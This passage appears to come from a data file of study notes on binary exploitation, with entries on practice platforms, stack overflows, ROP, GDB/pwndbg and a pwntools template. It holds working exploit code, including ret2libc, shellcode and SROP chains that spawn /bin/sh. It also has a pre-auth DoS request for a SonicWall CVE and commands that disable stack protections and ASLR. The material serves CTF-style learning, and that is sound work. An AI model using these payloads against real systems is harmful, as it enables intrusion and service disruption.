[security.stackexchange.com](https://security.stackexchange.com/questions/135786/if-the-stack-grows-downwards-how-can-a-buffer-overflow-overwrite-content-above)

![Call Stack - buffer overflow vulnerability | ZeroBone](https://zerobone.net/assets/img/blog/call-stack-buffer-overflow-tmb@0,5x.jpg)

[zerobone.net](https://zerobone.net/blog/cs/call-stack-buffer-overflow/)

![Windows Exploit Development With Buffer Overflow Example 1 | by ...](https://miro.medium.com/1*srairTVcbwgy9pvT9zq7rg.jpeg)

[whichbuffer.medium.com](https://whichbuffer.medium.com/windows-exploit-development-with-buffer-overflow-example-1-158ddcc029fe)

![28 Security — An Introduction to Computer Networks, unicode-safer ...](https://intronetworks.cs.luc.edu/current/uhtml/_images/basic_stack_overflow.svg)

[intronetworks.cs.luc.edu](https://intronetworks.cs.luc.edu/current/uhtml/security.html)

Classic stack smashing: Overflow travels "up" the frame (towards higher addresses) to hit the return address.

This is the foundation of basic binary exploitation (what you're learning now). Modern protections (ASLR, NX, Stack Canaries) make it harder, but understanding the raw stack is key to everything else (ROP, heap exploits, etc.).`,
  },
  {
    id: "practice-platforms",
    title: "Practice Platforms — Pwn & Reverse Engineering",
    excerpt: "Curated list of platforms for practicing binary exploitation skills including wargames, CTF archives, and vulnerable-by-design applications.",
    category: "Binary Exploitation",
    content: `# Practice Platforms — Pwn & Reverse Engineering
> Sources: [Crypto-Cat CTF Resources](https://github.com/Crypto-Cat/CTF#readme) | [HackTricks](https://book.hacktricks.wiki/)

---

## Pwn / Binary Exploitation

| Platform | Focus | Link |
|---|---|---|
| **pwn.college** | Structured binary exploitation course | [pwn.college](https://pwn.college/) |
| **ROP Emporium** | Progressive ROP challenges (8 levels) | [ropemporium.com](https://ropemporium.com/) |
| **Exploit Education** | Phoenix — stack, heap, format strings | [exploit.education](https://exploit.education/) |
| **How2Heap** | Heap exploitation techniques (shellphish) | [GitHub](https://github.com/shellphish/how2heap) |
| **Pwnable.kr** | Classic pwn challenges | [pwnable.kr](https://pwnable.kr/) |
| **Nightmare** | Binary exploitation with walkthroughs | [guyinatuxedo.github.io](https://guyinatuxedo.github.io/) |
| **Ir0nstone** | Binexp notes & challenges | [ir0nstone.gitbook.io](https://ir0nstone.gitbook.io/notes) |
| **Microcorruption** | Embedded CTF (MSP430 assembly) | [microcorruption.com](https://microcorruption.com/) |

---

## Reverse Engineering

| Platform | Focus | Link |
|---|---|---|
| **Challenges.re** | RE challenges by difficulty | [challenges.re](https://challenges.re/) |
| **CrackMes** | User-submitted crackmes | [crackmes.one](https://crackmes.one/) |
| **OpenSecurityTraining2** | Free RE/security courses | [p.ost2.fyi](https://p.ost2.fyi/courses) |
| **Azeria Labs** | ARM assembly & exploitation | [azeria-labs.com](https://azeria-labs.com/writing-arm-assembly-part-1/) |
| **GuidedHacking** | Game hacking & RE | [guidedhacking.com](https://guidedhacking.com/) |

---

## CTF Platforms (General)

| Platform | Link |
|---|---|
| **CTFTime** | [ctftime.org](https://ctftime.org/) |
| **PicoCTF** | [play.picoctf.org](https://play.picoctf.org/) |
| **OverTheWire** | [overthewire.org](https://overthewire.org/wargames/) |
| **ImaginaryCTF** | [imaginaryctf.org](https://imaginaryctf.org/) |
| **247CTF** | [247ctf.com](https://247ctf.com/) |
| **CryptoHack** | [cryptohack.org](https://cryptohack.org/) |
| **Google CTF** | [capturetheflag.withgoogle.com](https://capturetheflag.withgoogle.com/) |
| **Hacker 101** | [ctf.hacker101.com](https://ctf.hacker101.com/) |

---

## Pentesting Labs

| Platform | Link |
|---|---|
| **HackTheBox** | [hackthebox.com](https://www.hackthebox.com/) |
| **TryHackMe** | [tryhackme.com](https://tryhackme.com/) |
| **OffSec Proving Grounds** | [offsec.com](https://www.offsec.com/products/proving-grounds/) |
| **Web Security Academy** | [portswigger.net](https://portswigger.net/web-security) |
| **PentesterLab** | [pentesterlab.com](https://pentesterlab.com/) |
| **DVWA** | [GitHub](https://github.com/digininja/DVWA) |
| **Juice Shop** | [GitHub](https://github.com/juice-shop/juice-shop-ctf) |

---

## Blue Team / DFIR

| Platform | Link |
|---|---|
| **DFIR Labs** | [dfirlabs.thedfirreport.com](https://dfirlabs.thedfirreport.com/) |
| **XINTRA** | [xintra.org](https://www.xintra.org/) |
| **LetsDefend** | [letsdefend.io](https://letsdefend.io/) |
| **Blue Team Labs Online** | [blueteamlabs.online](https://blueteamlabs.online/) |
| **CyberDefenders** | [cyberdefenders.org](https://cyberdefenders.org/) |

---

## Crypto-Cat Recommended Learning Paths

### Binary Exploitation 101 (11 videos)
[YouTube Playlist](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec8)

1. **00 — Intro** → Environment setup, tools, basic concepts
2. **01 — Overwriting Variables** → Stack overflow basics
3. **02 — Overwriting Functions** → Redirect execution
4. **03 — Shellcode Intro** → NX disabled exploitation
5. **04 — Shellcoding** → Custom shellcode injection
6. **05 — Intro to ROP** → Return Oriented Programming
7. **06 — ret2libc** → Using libc functions
8. **07 — Format Strings** → Read/write arbitrary memory
9. **08 — Leak PIE + ret2libc** → Bypass PIE
10. **09 — Leak canary + ret2libc** → Bypass stack canary
11. **10 — Bypassing Canaries** → Brute force & leak techniques

### ROP Emporium (8 challenges)
[YouTube Playlist](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec8)

1. ret2win → 2. split → 3. callme → 4. write4 → 5. badchars → 6. fluff → 7. pivot → 8. ret2csu

---

## Compilation Cheat Sheet (for practice)

\`\`\`bash
# All protections OFF (easiest)
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32

# 64-bit, no protections
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie

# With NX (no shellcode on stack)
gcc vuln.c -o vuln -fno-stack-protector -no-pie

# Everything ON (hardest)
gcc vuln.c -o vuln -fstack-protector-all -pie -z relro -z now

# Disable ASLR system-wide
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
\`\`\`
`,
  },
  {
    id: "stack-overflow",
    title: "Stack Overflow",
    excerpt: "Stack-based buffer overflow exploitation covering return address overwrite, shellcode injection, NOP sleds, and controlling program execution flow.",
    category: "Binary Exploitation",
    content: `# Stack Overflow
> Sources: [HackTricks - Stack Overflow](https://book.hacktricks.wiki/en/binary-exploitation/stack-overflow/index.html) | [Crypto-Cat Binary Exploitation 101](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101)

---

## What is a Stack Overflow?

A **stack overflow** occurs when a program writes more data to the stack than allocated. This overwrites adjacent memory — including the **saved return address (EIP/RIP)** and **saved base pointer (EBP/RBP)**.

### Vulnerable Functions
\`\`\`c
gets(buffer);        // NEVER use - no bounds checking
strcpy(dst, src);    // No length limit
strcat(dst, src);    // No length limit
sprintf(buf, fmt);   // No length limit
scanf("%s", buf);    // No length limit

// These CAN be vulnerable if length > allocation:
fgets(buf, len, fp); 
read(fd, buf, len);
memcpy(dst, src, len);
\`\`\`

### Example Vulnerable Code
\`\`\`c
void vulnerable() {
    char buffer[128];
    printf("Enter some text: ");
    gets(buffer); // <-- OVERFLOW HERE
    printf("You entered: %s\\n", buffer);
}
\`\`\`

---

## Finding the Offset

### Method 1: De Bruijn Sequence (pwntools)
\`\`\`python
from pwn import *

# Generate pattern
pattern = cyclic(1000)

# After crash, find offset from EIP value
eip_value = p32(0x6161616c)
offset = cyclic_find(eip_value)
print(f"Offset: {offset}")
\`\`\`

### Method 2: GEF/GDB
\`\`\`bash
# Generate pattern
pattern create 200

# After crash, find offset
pattern search $rsp
pattern search "avaaawaa"
\`\`\`

### Method 3: Manual
\`\`\`python
# Send increasing 'A's until crash
python3 -c 'print("A"*1000)' | ./binary
# If crash at 0x41414141 → you control EIP
\`\`\`

---

## Exploitation Techniques

### 1. Ret2win (Simplest)
There's a hidden function (e.g., \`win()\`, \`flag()\`) that's never called. Overwrite return address to call it.

\`\`\`python
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

offset = 76  # found via pattern
win_addr = elf.symbols['win']  # or find via objdump

payload = b'A' * offset
payload += p32(win_addr)

p.sendline(payload)
p.interactive()
\`\`\`

### 2. Ret2win with Parameters (64-bit)
In x86-64, first 6 args go in registers: \`RDI, RSI, RDX, RCX, R8, R9\`

\`\`\`python
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # stack alignment

payload = b'A' * offset
payload += p64(ret)           # align stack (Ubuntu 18.04+)
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)    # arg1
payload += p64(elf.symbols['win'])

p.sendline(payload)
\`\`\`

### 3. Stack Shellcode (NX disabled)
\`\`\`python
from pwn import *

context.arch = 'i386'  # or 'amd64'
shellcode = asm(shellcraft.sh())

buf_addr = 0xffffd080  # address of buffer (no ASLR)

payload = shellcode
payload += b'A' * (offset - len(shellcode))
payload += p32(buf_addr)

p.sendline(payload)
\`\`\`

### 4. Ret2libc (NX enabled)
\`\`\`python
from pwn import *

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
elf = ELF('./vuln')

# If ASLR disabled:
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p32(system)
payload += p32(0xdeadbeef)  # fake return addr
payload += p32(bin_sh)

p.sendline(payload)
\`\`\`

---

## 64-bit vs 32-bit Key Differences

| Feature | 32-bit | 64-bit |
|---|---|---|
| Addresses | 4 bytes | 8 bytes |
| Args passing | Stack | RDI, RSI, RDX, RCX, R8, R9 |
| Return addr | \`p32()\` | \`p64()\` |
| Stack alignment | Not needed | Need \`ret\` gadget before function calls |
| ROP gadgets | \`pop eax; ret\` | \`pop rdi; ret\` etc. |

---

## Real-World CVE Examples (from HackTricks)

### CVE-2025-40596 (SonicWall SMA100)
\`\`\`c
char version[3];
char endpoint[0x800] = {0};
// No length limit on %s!
sscanf(uri, "%*[^/]/%2s/%s", version, endpoint);
\`\`\`
\`\`\`python
# Pre-auth DoS
import requests
url = "https://TARGET/__api__/v1/" + "A"*3000
requests.get(url, verify=False)
\`\`\`

### CVE-2025-12686 (Synology BeeStation - Pwn2Own 2025)
- Pre-auth overflow in Base64-decoded JSON
- Fork-based server → all children share same canary
- Brute-force canary byte-by-byte using HTTP response oracle (200 vs 502)
- Once canary + PIE base known → ROP chain to \`execl("/bin/bash")\`

---

## References
- [HackTricks Stack Overflow](https://book.hacktricks.wiki/en/binary-exploitation/stack-overflow/index.html)
- [Crypto-Cat: Overwriting Stack Variables](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/01-overwriting_stack_variables_part1)
- [Crypto-Cat: Return to Win](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/03-return_to_win)
- [Crypto-Cat: Custom Shellcode](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/05-injecting_custom_shellcode)
- [Crypto-Cat: Return to Libc](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/06-return_to_libc)
`,
  },
  {
    id: "rop-fundamentals",
    title: "Return Oriented Programming (ROP)",
    excerpt: "Return-oriented programming fundamentals including gadget discovery, chain construction, ret2libc, and bypassing NX protection through code reuse attacks.",
    category: "Binary Exploitation",
    content: `# Return Oriented Programming (ROP)
> Sources: [HackTricks - ROP](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/index.html) | [Crypto-Cat ROP Emporium](https://github.com/Crypto-Cat/CTF/tree/main/pwn/rop_emporium) ([VIDEO Series](https://www.youtube.com/watch?v=oBZy0bGNezo&list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu))

---

## What is ROP?

**Return Oriented Programming** chains together small instruction sequences ending in \`ret\` (called **gadgets**) from the binary itself to perform arbitrary actions — bypassing **NX/DEP** (non-executable stack).

\`\`\`
[overflow padding] → [gadget1_addr] → [gadget2_addr] → ... → [function_addr]
\`\`\`

---

## Finding ROP Gadgets

\`\`\`bash
# ROPgadget
ROPgadget --binary ./vuln
ROPgadget --binary ./vuln --ropchain

# ropper
ropper --file ./vuln
ropper --file ./vuln --search "pop rdi"

# pwntools
from pwn import *
elf = ELF('./vuln')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
\`\`\`

---

## ROP Emporium Challenges (Crypto-Cat)

### 1. Ret2win — Basic ROP
Overwrite return address → call \`ret2win()\` function.

### 2. Split — Function + Argument
Call \`system()\` with \`"/bin/cat flag.txt"\` string that exists in binary.
\`\`\`python
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(useful_string_addr)
payload += p64(system_plt)
\`\`\`

### 3. Callme — Multiple Calls with Args
Call \`callme_one(1, 2, 3)\` → \`callme_two(1, 2, 3)\` → \`callme_three(1, 2, 3)\`.
\`\`\`python
payload = b'A' * offset
for func in [callme_one, callme_two, callme_three]:
    payload += p64(pop_rdi_rsi_rdx)
    payload += p64(1) + p64(2) + p64(3)
    payload += p64(func)
\`\`\`

### 4. Write4 — Write to Memory
Use \`mov [r14], r15; ret\` gadget to write "/bin/sh" to writable section, then call \`system()\`.

### 5. Badchars — Encoding
Some characters are filtered. XOR encode payload, use ROP to decode in memory.

### 6. Fluff — Exotic Gadgets
Same goal as write4 but with unusual gadgets (\`xlatb\`, \`stosb\`, \`bswap\`, etc.).

### 7. Pivot — Stack Pivot
Stack space is limited → pivot to a larger writable area using \`xchg esp, eax; ret\`.

### 8. Ret2csu — __libc_csu_init
Use universal gadgets in \`__libc_csu_init\` to control \`rdx\`, \`rsi\`, \`edi\` and call function pointers.

---

## Common ROP Techniques

### Ret2libc (Bypass NX)
\`\`\`python
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Leak puts() address from GOT
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])  # return to main

p.sendline(b'A' * offset + rop.chain())

# Parse leak
leaked_puts = u64(p.recvline()[:6].ljust(8, b'\\x00'))
libc.address = leaked_puts - libc.symbols['puts']

# Second stage - call system("/bin/sh")
rop2 = ROP(libc)
rop2.system(next(libc.search(b'/bin/sh')))

p.sendline(b'A' * offset + rop2.chain())
p.interactive()
\`\`\`

### Ret2syscall (execve)
\`\`\`python
# 64-bit: syscall number in RAX, args in RDI, RSI, RDX
# execve("/bin/sh", NULL, NULL) = syscall 59

payload = b'A' * offset
payload += p64(pop_rax) + p64(59)           # execve syscall number
payload += p64(pop_rdi) + p64(bin_sh_addr)  # "/bin/sh"
payload += p64(pop_rsi) + p64(0)            # NULL
payload += p64(pop_rdx) + p64(0)            # NULL
payload += p64(syscall_ret)
\`\`\`

### SROP (Sigreturn Oriented Programming)
Use \`sigreturn\` syscall to set ALL registers at once from a fake signal frame.
\`\`\`python
from pwn import *

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = bin_sh_addr # "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = b'A' * offset
payload += p64(pop_rax) + p64(15)  # sigreturn syscall
payload += p64(syscall_ret)
payload += bytes(frame)
\`\`\`

### Ret2dlresolve
Fake a dynamic symbol resolution to call any libc function without knowing libc base. Complex but powerful against ASLR.

### BROP (Blind ROP)
Remotely discover gadgets by observing crash/no-crash behavior. Requires a fork-based server.

---

## Ret2csu Gadgets

Found in \`__libc_csu_init\` of virtually every dynamically-linked ELF:
\`\`\`
Gadget 1 (pop):
    pop rbx    ; 0
    pop rbp    ; 1
    pop r12    ; function pointer (GOT entry)
    pop r13    ; arg3 (rdx)
    pop r14    ; arg2 (rsi)
    pop r15    ; arg1 (edi)
    ret

Gadget 2 (call):
    mov rdx, r13
    mov rsi, r14
    mov edi, r15d
    call [r12 + rbx*8]
\`\`\`

---

## Stack Alignment (64-bit)
Ubuntu 18.04+ requires 16-byte stack alignment before function calls. Add a \`ret\` gadget if \`system()\` crashes:
\`\`\`python
payload = b'A' * offset
payload += p64(ret_gadget)    # Stack alignment!
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
\`\`\`

---

## References
- [HackTricks ROP](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/index.html)
- [Crypto-Cat ROP Emporium](https://github.com/Crypto-Cat/CTF/tree/main/pwn/rop_emporium) ([VIDEO](https://www.youtube.com/watch?v=oBZy0bGNezo&list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu))
- [Crypto-Cat: Leak PIE + Ret2libc](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/08-leak_pie_ret2libc)
- [ROPEmporium.com](https://ropemporium.com/)
- [Ret2csu HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/ret2csu.html)
- [SROP HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming/index.html)
`,
  },
  {
    id: "gdb-debugging-tools",
    title: "GDB & Debugging Tools Reference",
    excerpt: "Comprehensive guide to GDB and debugging tools for binary exploitation, including breakpoints, memory examination, and essential debugging workflows.",
    category: "Binary Exploitation",
    content: `# GDB & Debugging Tools Reference
> Complements: [[PWNDBG]] (existing cheat sheet)

---

## GDB with Pwndbg

### Installation
\`\`\`bash
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh
\`\`\`

### Starting
\`\`\`bash
gdb ./binary                    # Load binary
gdb -q ./binary                 # Quiet mode
gdb -p <pid>                    # Attach to process
\`\`\`

### Essential Commands
\`\`\`bash
# Execution
r                               # Run
r < input.txt                   # Run with stdin from file
r $(python3 -c 'print("A"*100)')  # Run with argument
c                               # Continue
ni                              # Next instruction (step over)
si                              # Step instruction (step into)
finish                          # Run until current function returns

# Breakpoints
b main                          # Break at main
b *0x401234                     # Break at address
b *main+42                      # Break at offset
info b                          # List breakpoints
del 1                           # Delete breakpoint #1
disable 1                       # Disable breakpoint #1

# Examination
x/20wx $rsp                     # 20 words hex at RSP
x/s 0x402000                    # String at address
x/10i $rip                      # 10 instructions at RIP
x/20gx $rsp                     # 20 giant (8-byte) hex at RSP
p $rax                          # Print register value
p/x $rax                        # Print in hex
info reg                        # All registers
\`\`\`

### Pwndbg Specific
\`\`\`bash
# Heap
heap                            # Heap overview
bins                            # All bins
vis_heap_chunks                 # Visual heap layout
tcachebins                      # Tcache bins
fastbins                        # Fastbins

# Stack
stack 20                        # Show 20 stack entries
canary                          # Show canary value
retaddr                         # Show return address

# Search
search -s "/bin/sh"             # Search for string
search -p 0xdeadbeef            # Search for pointer

# Analysis  
checksec                        # Show binary protections
vmmap                           # Memory mappings
got                             # GOT entries
plt                             # PLT entries
rop                             # Find ROP gadgets

# Context
context                         # Refresh display
set context-sections all        # Show all sections
\`\`\`

---

## Other Useful Tools

### ROPgadget
\`\`\`bash
ROPgadget --binary ./vuln
ROPgadget --binary ./vuln --ropchain    # Auto-generate chain
ROPgadget --binary ./vuln | grep "pop rdi"
\`\`\`

### ropper
\`\`\`bash
ropper --file ./vuln
ropper --file ./vuln --search "pop rdi"
\`\`\`

### checksec
\`\`\`bash
checksec --file=./vuln
\`\`\`

### objdump
\`\`\`bash
objdump -d ./vuln               # Disassemble
objdump -d ./vuln | grep main   # Find main
objdump -t ./vuln               # Symbol table
objdump -R ./vuln               # Relocations (GOT entries)
\`\`\`

### readelf
\`\`\`bash
readelf -h ./vuln               # ELF header
readelf -S ./vuln               # Sections
readelf -s ./vuln               # Symbols
readelf -l ./vuln               # Program headers
\`\`\`

### one_gadget
\`\`\`bash
# Find one-shot RCE gadgets in libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
\`\`\`

### pwninit
\`\`\`bash
# Auto-patch binary with correct libc/ld
pwninit --bin ./vuln --libc ./libc.so.6
\`\`\`

### seccomp-tools
\`\`\`bash
# Dump seccomp (sandbox) rules
seccomp-tools dump ./vuln
\`\`\`

---

## References
- [Pwndbg GitHub](https://github.com/pwndbg/pwndbg)
- [GEF GitHub](https://github.com/hugsy/gef)
- [PEDA GitHub](https://github.com/longld/peda)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
`,
  },
  {
    id: "pwndbg",
    title: "GDB + Pwndbg Cheat Sheet",
    excerpt: "Guide to using pwndbg, a GDB plugin for exploit development, covering its enhanced commands for heap analysis, register display, and memory inspection.",
    category: "Binary Exploitation",
    content: `
# GDB + Pwndbg Cheat Sheet
> Sources: [Pwndbg GitHub](https://github.com/pwndbg/pwndbg) | [Crypto-Cat CTF](https://github.com/Crypto-Cat/CTF/tree/main/pwn) | [HackTricks](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)

---

## Starting GDB

\`\`\`bash
gdb-pwndbg ./binary              # With pwndbg
gdb-peda ./binary                # With PEDA
gdb-gef ./binary                 # With GEF
gdb ./binary                     # Vanilla GDB
gdb -q ./binary                  # Quiet mode (no banner)
gdb -p <PID>                     # Attach to running process
\`\`\`

---

## Execution Control

\`\`\`bash
run                               # Start program
run < input.txt                   # Run with file as stdin
run $(python3 -c 'print("A"*100)')  # Run with argument
continue (c)                      # Continue execution
nexti (ni)                        # Step one instruction (OVER calls)
stepi (si)                        # Step one instruction (INTO calls)
finish                            # Run until current function returns
until *0x401234                   # Run until address
set $rip = 0x401234               # Jump to address (change EIP/RIP)
jump *main+525                    # Jump directly to address
\`\`\`

---

## Breakpoints

\`\`\`bash
break main                        # Break at function
break *0x8049123                  # Break at exact address
break *main+42                    # Break at offset into function
break *0x401234 if $rax == 0      # Conditional breakpoint
info breakpoints (info b)         # List all breakpoints
delete 1                          # Delete breakpoint #1
delete                            # Delete ALL breakpoints
disable 1                         # Disable breakpoint #1
enable 1                          # Enable breakpoint #1
tbreak *0x401234                  # Temporary (hit once, auto-delete)
\`\`\`

---

## Examining Memory (x command)

**Format:** \`x/NFU address\` → N=count, F=format, U=unit size

\`\`\`bash
# Formats: x=hex, d=decimal, s=string, i=instruction, c=char
# Units:   b=byte, h=halfword(2), w=word(4), g=giant(8)

x/10i $rip                       # 10 instructions at RIP
x/20gx $rsp                      # 20 qwords (8-byte) hex at stack top
x/40wx $esp                      # 40 words (4-byte) hex at ESP (32-bit)
x/s 0x402000                     # String at address
x/10s $rsp                       # 10 strings starting at RSP
x/20bx $rsp                      # 20 bytes hex at RSP
x/i $rip                         # Single instruction at RIP
x/50i main                       # Disassemble 50 instructions of main
\`\`\`

---

## Registers

\`\`\`bash
info registers (info reg)         # All general registers
info all-registers                # ALL registers (including FP, SSE)
p $rax                            # Print single register
p/x $rax                          # Print in hex
p/d $rax                          # Print in decimal
p/t $rax                          # Print in binary
set $rax = 0x41414141             # Modify register value
set $rip = 0x401234               # Redirect execution
\`\`\`

### Key Registers for Exploitation

**x86-64:**
| Register | Purpose |
|---|---|
| \`RIP\` | Instruction pointer (next instruction) |
| \`RSP\` | Stack pointer (top of stack) |
| \`RBP\` | Base pointer (stack frame base) |
| \`RDI\` | 1st argument |
| \`RSI\` | 2nd argument |
| \`RDX\` | 3rd argument |
| \`RCX\` | 4th argument |
| \`R8\`  | 5th argument |
| \`R9\`  | 6th argument |
| \`RAX\` | Return value |

**x86 (32-bit):** Arguments are pushed on the stack right-to-left.

---

## Pwndbg-Specific Commands

\`\`\`bash
# Context display
context                           # Refresh full display
set context-sections all          # Show everything
set context-sections regs,disasm,stack,backtrace

# Security
checksec                          # Show binary protections

# Memory map
vmmap                             # Memory mappings (like /proc/pid/maps)
vmmap libc                        # Find libc base address

# GOT / PLT
got                               # Display GOT entries (resolved addresses)
plt                               # Display PLT entries

# Stack
stack 30                          # Show 30 stack entries
canary                            # Show stack canary value
retaddr                           # Show return address on stack

# Heap (critical for heap exploitation)
heap                              # Heap overview
vis_heap_chunks                   # Visual heap layout
bins                              # All bins (tcache, fast, unsorted, small, large)
tcachebins                        # Tcache bins specifically
fastbins                          # Fastbin entries
unsortedbin                       # Unsorted bin
smallbins                         # Small bins
largebins                         # Large bins
top_chunk                         # Top chunk info
malloc_chunk <addr>               # Inspect specific chunk

# Search
search -s "/bin/sh"               # Search for string in memory
search -p 0xdeadbeef              # Search for pointer/value
search -s "flag{" .               # Search in current binary only

# ROP
rop                               # Find ROP gadgets
rop --grep "pop rdi"              # Filter ROP gadgets

# Cyclic pattern (for offset finding)
cyclic 200                        # Generate pattern
cyclic -l 0x61616166              # Find offset from pattern value
\`\`\`

---

## Debugging Exploitation Techniques

### Finding Buffer Overflow Offset
\`\`\`bash
# Method 1: Pwndbg cyclic
pwndbg> cyclic 200                # Generate pattern
pwndbg> run                       # Paste pattern as input
# After crash:
pwndbg> cyclic -l $rsp            # x64: look at RSP
pwndbg> cyclic -l $eip            # x86: look at EIP

# Method 2: Manual
pwndbg> run <<< $(python3 -c 'print("A"*100 + "BBBB")')
# Check if EIP/RIP = 0x42424242
\`\`\`

### Setting Up for Pwntools GDB Attach
\`\`\`python
# In your exploit script:
io = gdb.debug('./binary', '''
    break main
    break *0x401234
    continue
''')
\`\`\`

### Examining the Stack Frame
\`\`\`bash
# After hitting breakpoint in vulnerable function:
info frame                        # Current frame info
backtrace (bt)                    # Full call stack
x/20gx $rbp-0x40                 # Look at local variables
x/20gx $rsp                      # Look at stack from top

# Find distance from buffer to return address
p/d $rbp - <buffer_address> + 8  # +8 for saved RBP (x64)
\`\`\`

### Verifying Exploit Payloads
\`\`\`bash
# Before function return:
x/gx $rbp+8                      # Check what return address will be
x/10gx $rsp                      # After ret, check ROP chain on stack

# Check if shellcode landed correctly:
x/20i <shellcode_address>         # Disassemble your shellcode
\`\`\`

---

## Tips & Tricks

\`\`\`bash
# Follow the child in fork
set follow-fork-mode child
set detach-on-fork off

# Disable ASLR in GDB (default)
set disable-randomization on      # Already default

# Continue on signals (useful for SIGSEGV analysis)
handle SIGSEGV nostop noprint pass

# Python in GDB
python print(hex(gdb.parse_and_eval("$rsp")))

# Log all output
set logging on
set logging file gdb.log

# Load symbols from separate file
symbol-file ./binary.debug

# Disassemble in Intel syntax
set disassembly-flavor intel
\`\`\`

---

## GDB Plugin Comparison

| Feature | Pwndbg | GEF | PEDA |
|---|---|---|---|
| Heap analysis | Excellent | Good | Basic |
| ROP search | Built-in | Built-in | Basic |
| Context display | Best | Good | Good |
| Heap visualization | \`vis_heap_chunks\` | \`heap bins\` | Limited |
| Active development | Very active | Active | Slow |
| Best for | Pwn/heap | General | Beginners |

---

## References
- [Pwndbg GitHub](https://github.com/pwndbg/pwndbg)
- [GEF GitHub](https://github.com/hugsy/gef)
- [PEDA GitHub](https://github.com/longld/peda)
- [Crypto-Cat: GDB in Binary Exploitation](https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101)
- [HackTricks: GDB for Binary Exploitation](https://book.hacktricks.wiki/en/binary-exploitation/common-binary-protections-and-bypasses/index.html)`,
  },
  {
    id: "pwntools-template",
    title: "Pwntools Exploit Template",
    excerpt: "Reusable pwntools exploit template with boilerplate for local and remote connections, ELF loading, ROP chain building, and payload construction.",
    category: "Binary Exploitation",
    content: `# Pwntools Exploit Template
> Source: [Crypto-Cat Official Template](https://github.com/Crypto-Cat/CTF/blob/main/pwn/official_template.py)

---

## Full Template

\`\`\`python
from pwn import *


# ============================================================
#                    CONFIGURATION
# ============================================================

# Binary filename
exe = './vuln'

# Auto-detect arch, bits, os, endianness
elf = context.binary = ELF(exe, checksec=False)

# Logging level (error/warning/info/debug)
context.log_level = 'info'

# Libc (use pwninit/patchelf to patch binary)
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")


# ============================================================
#                    HELPER FUNCTIONS
# ============================================================

def start(argv=[], *a, **kw):
    """Switch between local/GDB/remote from terminal"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    """Find offset to EIP/RIP for buffer overflows"""
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    p.wait()
    
    # x86
    # ip_offset = cyclic_find(p.corefile.pc)
    
    # x64
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# GDB script (breakpoints, init, etc.)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# ============================================================
#                    EXPLOIT GOES HERE
# ============================================================

# Find EIP/RIP offset
offset = find_ip(cyclic(500))

# Start program
io = start()

# Build the payload
payload = flat({
    offset: [
        # ROP chain / address goes here
    ]
})

# Send the payload
io.sendlineafter(b'>', payload)

# Got Shell?
io.interactive()
\`\`\`

---

## Usage

\`\`\`bash
# Run locally
python3 exploit.py

# Run under GDB
python3 exploit.py GDB

# Run against remote
python3 exploit.py REMOTE <host> <port>
\`\`\`

---

## Essential Pwntools Snippets

### Finding Offset (De Bruijn Pattern)
\`\`\`python
# Generate cyclic pattern
payload = cyclic(200)

# Find offset from crash
offset = cyclic_find(0x61616166)      # x86: value in EIP
offset = cyclic_find(b'faaa')         # x64: value at RSP
\`\`\`

### Packing / Unpacking Addresses
\`\`\`python
p32(0xdeadbeef)          # Pack 32-bit little-endian
p64(0xdeadbeef)          # Pack 64-bit little-endian
u32(b'\\xef\\xbe\\xad\\xde')  # Unpack 32-bit
u64(b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00')  # Unpack 64-bit
\`\`\`

### Leaking Addresses
\`\`\`python
# Leak GOT entry via puts
io.recvuntil(b'output: ')
leak = u64(io.recvline().strip().ljust(8, b'\\x00'))
log.info(f"Leaked address: {hex(leak)}")

# Calculate libc base
